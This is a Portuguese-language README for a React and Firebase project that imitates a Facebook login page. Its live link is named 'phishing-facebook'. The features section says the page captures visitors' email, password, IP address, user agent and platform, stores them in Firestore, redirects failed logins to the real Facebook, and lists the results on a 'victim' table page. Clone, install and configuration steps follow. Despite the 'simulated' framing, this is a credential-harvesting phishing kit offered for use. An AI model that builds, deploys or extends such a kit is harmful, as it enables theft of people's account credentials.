🚨# Projeto de Login com Firebase e Material-UI

Este projeto é uma aplicação de login utilizando React, Firebase e Material-UI. Ele simula um sistema de login com captura de dados de login e redireciona o usuário para uma página oficial caso o login falhe.
##Link do projeto:
[Visite o meu projeto](https://phishing-facebook.vercel.app)


## Funcionalidades

- **Login Simulado**: Ao tentar fazer login, o sistema captura os dados inseridos, como e-mail, senha, endereço IP, user agent e a plataforma utilizada.
- **Armazenamento no Firebase**: As informações de login são salvas em um banco de dados Firestore no Firebase.
- **Modal de Erro**: Em caso de falha no login, um modal é exibido com a opção de redirecionar o usuário para o Facebook para tentar o login novamente.
- **Redirecionamento Condicional**: Caso o login seja bem-sucedido, o usuário será alertado com uma mensagem de sucesso.

## Tecnologias Utilizadas

- **React**: Biblioteca para construção da interface de usuário.
- **Firebase**: Para armazenar as informações de login no Firestore.
- **Material-UI**: Para componentes de interface de usuário, como botões e tipografia.
- **React Router**: Para navegação entre as páginas da aplicação.

## Pré-requisitos

Antes de começar, é necessário ter instalado:

- [Node.js](https://nodejs.org/) (versão 16 ou superior)
- [Firebase](https://firebase.google.com/) configurado no seu projeto

```bash
/src
  /components
    LoginForm.tsx              # Componente de Login e rastreio
    VictimTablePage.tsx        # Página de visualização dos dados capturados
  /services
    firebase.ts                # Configuração do Firebase
  /assets
    ...                        # Arquivos de imagens, ícones, etc.
  App.tsx                      # Componente principal de navegação
  index.tsx                    # Arquivo de entrada da aplicação

```


## 🔧 **Instalação e Configuração**

### 1. **Clone o Repositório**

- **Primeiro,** clone o repositório para sua máquina local:

```bash
git clone https://github.com/joaocarpim/phishing-RastreadorFast.git
cd rastreio-fast
```
### 2. Instale as Dependências
- **Instale** todas as dependências do projeto:

```bash
npm install

```

### 3. Configuração do Firebase
- **Crie** um novo projeto no Firebase Console.

- **Habilite** o Firestore e configure as regras de segurança.

- **Crie** um arquivo firebase.ts em /src/services/ e adicione as credenciais do seu projeto Firebase.

```bash
// src/services/firebase.ts
import { initializeApp } from "firebase/app";
import { getFirestore } from "firebase/firestore";

// Configuração do seu projeto Firebase
const firebaseConfig = {
  apiKey: "sua-api-key",
  authDomain: "seu-app-id.firebaseapp.com",
  projectId: "seu-app-id",
  storageBucket: "seu-app-id.appspot.com",
  messagingSenderId: "seu-id",
  appId: "seu-app-id",
  measurementId: "seu-id"
};

// Inicializando o Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

export { db };

```

### 4. Inicie o projeto
**Para iniciar o projeto, execute o comando:**

```bash
npm start
```

**O servidor estará disponível em http://localhost:3000.**

## 🚨 **Aviso Importante:**

- **Segurança:** Nunca armazene senhas em texto claro em um banco de dados de produção. Este exemplo armazena senhas de forma simples para fins de demonstração. Para um sistema real, use uma estratégia de criptografia de senha segura.

- **Firebase Regras de Segurança:** Configure corretamente as regras de segurança do Firestore, permitindo que apenas usuários autenticados acessem os dados.

## 🎨 **Personalização e Expansões**

- **Design:** A interface foi construída com o Material UI, mas pode ser facilmente personalizada para se alinhar com seu design ou identidade visual.

### **Funções Adicionais:**

- **Filtros e Pesquisa:** Você pode adicionar filtros para buscar dados na tabela.

- **Paginação:** Se houver muitos dados, seria interessante adicionar paginação na tabela.

- **Exportação para CSV ou Excel:** Podemos expandir a exportação para formatos como CSV ou Excel usando bibliotecas como `xlsx`.

## 🤝 **Contribuição**

Se você deseja contribuir para este projeto, sinta-se à vontade para abrir um pull request ou issue. Fique à vontade para melhorar a funcionalidade ou sugerir novas ideias!

